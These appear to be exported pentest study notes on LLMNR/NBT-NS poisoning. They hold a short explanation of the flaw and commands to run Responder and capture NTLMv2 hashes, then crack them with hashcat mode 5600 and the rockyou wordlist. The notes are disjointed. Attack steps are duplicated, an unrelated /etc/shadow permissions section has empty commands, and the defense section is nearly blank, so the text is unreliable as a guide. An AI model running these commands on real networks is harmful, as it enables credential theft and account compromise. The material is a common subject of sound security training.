# LLMNR Poisoning
 ![Exported image](Exported%20image%2020241208212303-0.png)

What's LLMNR?

- LLMNR is used to identify hosts when DNS fails to do so.
- Previously NBT-NS (NetBIOS name service)
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to

**Step 1: Run responder**  
python responder.py -I tun0 -rdw
 
```
Step 2: An event occurs 
Step 3: Get dem hashes  
Step 4: Crack the hashes  
hashcat -m 5600 hashes.txt rockyou.txt



```

![Exported image](Exported%20image%2020241208212305-1.png)

**Step 3: Get dem hashes**  
**Step 4: Crack the hashes**  
hashcat -m 5600 hashes.txt rockyou.txt

**Step 1: Ensure/Double Check Permissions on Sensitive Files**

1. Permissions on /etc/shadow should allow only root read and write access.
    
    - Command to inspect permissions:
    - Command to set permissions (if needed):

**LLMNR Poisoning Defense**  
If DNS fails it goes to LLMNR. If LLMNR fails it goes to NBT-NS

![Exported image](Exported%20image%2020241208212306-2.png)